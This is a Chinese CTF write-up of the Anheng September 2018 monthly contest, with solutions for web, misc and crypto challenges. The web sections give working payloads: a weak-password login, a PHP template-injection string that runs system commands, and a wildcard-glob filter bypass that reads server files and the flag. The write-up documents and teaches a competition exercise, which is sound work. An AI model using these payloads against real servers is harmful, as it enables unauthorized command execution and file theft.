# 2018安恒杯 - 9月月赛Writeup

阅读量 **563046**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-24 10:00:59

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0129daa12fffb5a43b.jpg)

## 前言

中秋放假，做了一下安恒月赛，记录一下题解

## Web1

首先弱密码爆进后台

    
    
    admin
    admin123
    

看到突兀的字体

![](https://p4.ssl.qhimg.com/t01e00785c3fe5a1c1c.png)

一看就是出题人留下的了

探寻了一遍功能

发现添加图片处也有这种字体

![](https://p3.ssl.qhimg.com/t01a7a943b54d50db46.png)

很容易联想到漏洞点，于是开始代码审计

下载

    
    
    http://101.71.29.5:10013/web/You_Cant_Guess.zip
    

定位到图片位置

    
    
        public function actionShow(){
            $template = '<h1>图片内容为：</h1>图片ID：{cms:id}<br>图片名称:{cms:name}<br>图片地址：{cms:pic}';
            if (isset($_GET['id'])) {
                $model = new Content();
                $res = $model->find()->where(['id' =>intval($_GET['id'])])->one();
                $template = str_replace("{cms:id}",$res->id,$template);
                $template = str_replace("{cms:name}",$res->name,$template);
                $template = str_replace("{cms:pic}",$res->url,$template);
                $template = $this->parseIf($template);
                echo $template;
            }else{
                return json_encode(['error'=>'id error!']);
            }
        }
    

跟进函数`parseIf`````

![](https://p5.ssl.qhimg.com/t01cf2f5afb5041e9a2.png)

参考文章

    
    
    https://www.anquanke.com/post/id/153402
    

我们添加图片为

    
    
    skysec
    {if:1)$GLOBALS['_G'.'ET'][sky]($GLOBALS['_G'.'ET'][cool]);die();//}{end if}
    

然后访问

    
    
    http://101.71.29.5:10013/web/index.php?r=content%2Fshow&id=1919&sky=system&cool=ls
    

即可列目录

![](https://p3.ssl.qhimg.com/t0128c29b3ce64df646.png)

拿flag即可

![](https://p5.ssl.qhimg.com/t01b851c0be577421c1.png)

    
    
    flag{65bb1dd503d2a682b47fde40571598f4}
    

## Web2

拿到题目

    
    
    http://101.71.29.5:10014/
    

代码如下

    
    
    <?php
    include 'flag.php';
    if(isset($_GET['code'])){
        $code = $_GET['code'];
        if(strlen($code)>35){
            die("Long.");
        }
        if(preg_match("/[A-Za-z0-9_$]+/",$code)){
            die("NO.");
        }
        @eval($code);
    }else{
        highlight_file(__FILE__);
    }
    //$hint =  "php function getFlag() to get flag";
    ?>
    

发现字母啥都被过滤了，第一反应就是通配符，容易想到

    
    
    /???/??? => /bin/cat
    

那么构造

    
    
    $_=`/???/???%20/???/???/????/?????.???`;?><?=$_?>
    "/bin/cat /var/www/html/index.php"
    

长度超过了上限

参考这篇文章

    
    
    https://www.anquanke.com/post/id/154284
    

使用*通配

    
    
    $_=`/???/???%20/???/???/????/*`;?><?=$_?>
    

但是没有$和_  
改进为

    
    
    ?><?=`/???/???%20/???/???/????/*`?>
    

得到

![](https://p5.ssl.qhimg.com/t0142a5adfe99671c98.png)

发现关键点

    
    
    function getFlag(){
        $flag = file_get_contents('/flag');
        echo $flag;
    }
    

我们直接读flag文件就好

    
    
    ?><?=`/???/???%20/????`;?>
    

![](https://p3.ssl.qhimg.com/t01f52abc522d8c8fab.png)

得到flag

    
    
    flag{aa5237a5fc25af3fa07f1d724f7548d7}
    

## Misc1

下载用winrar打开

![](https://p0.ssl.qhimg.com/t01401df72741f53c50.png)

很明显的长度为6的CRC32

我们用工具爆破一下

![](https://p5.ssl.qhimg.com/t01a09045b59e790146.png)

![](https://p2.ssl.qhimg.com/t01aae0837644c77dee.png)

![](https://p1.ssl.qhimg.com/t0172a98fb202a7f887.png)

得到压缩包密码

    
    
    forum_91ctf_com_66
    

解密后得到

![](https://p1.ssl.qhimg.com/t016d4afa38e87a23fa.png)

我们n2s转成字符串，得到

![](https://p1.ssl.qhimg.com/t01c2feb4cc4b22c352.png)

![](https://p0.ssl.qhimg.com/t01c2b6626dc4904d84.png)

扫描得到flag

    
    
    flag{owid0-o91hf-9iahg}
    

## Misc2

拿到题目是张图片，binwalk跑了一下发现了压缩包

![](https://p2.ssl.qhimg.com/t01cee2d056abe75a29.png)

提取出来需要密码解压，尝试了各种方法，最后竟然是修改图片高度，太脑洞了吧？？？

![](https://p0.ssl.qhimg.com/t017d7e2bc8b5f0655b.png)

将原来的044C改为04FF，即可

![](https://p1.ssl.qhimg.com/t01c7f58da47302a2d8.png)

解压后得到一个压缩包，本能的导出html对象

![](https://p2.ssl.qhimg.com/t0135c67721be7bc278.png)

浏览一遍，发现可疑字符串，解base64，得到flag

    
    
    flag{Oz_4nd_Hir0_lov3_For3ver}
    

## Crypto1

这题略带脑洞，解压出的密文为

    
    
    ilnllliiikkninlekile
    

长度为20

![](https://p1.ssl.qhimg.com/t01e6dc76a3d129efb2.png)

并且发现提示

    
    
    The length of this plaintext: 10
    

密文长度是明文的2倍，然后密文只有5个字母出现，本能想到多表加密，但是不知道表的边缘的排序方式  
例如：

    
    
    ilnke
    iklne
    .....
    

因为排序规则不同，就涉及对应的字母不同，所以这里我选择爆破一发

    
    
    import itertools
    
    key = []
    cipher = "ilnllliiikkninlekile"
    
    for i in itertools.permutations('ilnke', 5):
        key.append(''.join(i))
    
    for now_key in key:
        solve_c = ""
        res = ""
        for now_c in cipher:
            solve_c += str(now_key.index(now_c))
        for i in range(0,len(solve_c),2):
            now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97
            if now_ascii>ord('i'):
                now_ascii+=1
            res += chr(now_ascii)
        if "flag" in res:
            print now_key,res
    

得到结果

    
    
    linke flagishere
    linek flagkxhdwd
    

一看就是第一个，结果交了不对。。。  
后来发现要交md5，得到flag

    
    
    flag{eedda7bea3964bfb288ca6004a973c2a}
    

## Crypto2

拿到题目

    
    
    #!/usr/bin/env python
    # -*- coding:utf-8 -*- 
    from Crypto.Cipher import AES
    from Crypto import Random
    
    def encrypt(data, password):
        bs = AES.block_size
        pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
        iv = "0102030405060708"
        cipher = AES.new(password, AES.MODE_CBC, iv)
        data = cipher.encrypt(pad(data))
        return data
    
    def decrypt(data, password):
        unpad = lambda s : s[0:-ord(s[-1])]
        iv = "0102030405060708"
        cipher = AES.new(password, AES.MODE_CBC, iv)
        data  = cipher.decrypt(data)
        return unpad(data)
    
    def generate_passwd(key):
        data_halt = "LvR7GrlG0A4WIMBrUwTFoA==".decode("base64")
        rand_int =  int(decrypt(data_halt, key).encode("hex"), 16)
        round = 0x7DC59612
        result = 1    
        a1 = 0
        while a1 < round:
            a2 = 0
            while a2 < round:
                a3 = 0
                while a3 < round:
                    result = result * (rand_int % 0xB18E) % 0xB18E
                    a3 += 1
                a2 += 1
            a1 += 1
        return encrypt(str(result), key)
    
    
    if __name__ == '__main__':
    
        key = raw_input("key:")
    
        if len(key) != 32:
            print "check key length!"
            exit()
        passwd = generate_passwd(key.decode("hex"))
    
        flag = raw_input("flag:")
    
        print "output:", encrypt(flag, passwd).encode("base64")
    
    # key = md5(sha1("flag"))
    # output = "u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"
    

我们不难看出这题的难点应该在于generate_passwd()了吧，加解密函数都给你写好了，调用就行，我们仔细观察这个generate_passwd()

    
    
    def generate_passwd(key):
        data_halt = "LvR7GrlG0A4WIMBrUwTFoA==".decode("base64")
        rand_int =  int(decrypt(data_halt, key).encode("hex"), 16)
        round = 0x7DC59612
        result = 1    
        a1 = 0
        while a1 < round:
            a2 = 0
            while a2 < round:
                a3 = 0
                while a3 < round:
                    result = result * (rand_int % 0xB18E) % 0xB18E
                    a3 += 1
                a2 += 1
            a1 += 1
        return encrypt(str(result), key)
    

看起来很复杂，还有3层循环，但仔细抓住result，发现其值一定小于0xB18E

那么爆破即可

    
    
    output = "u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"
    key = md5(sha1("flag"))
    for result in range(0xB18E):
        passwd = generate_passwd(key.decode("hex"),result)
        r = decrypt(output.decode("base64"), passwd)
        if 'flag' in r:
            print r
    

拿到flag

    
    
    flag{552d3a0e567542d99694c4d61d1a652e}
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/160582](/post/id/160582)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [writeup](/tag/writeup)

 **+1** __31赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

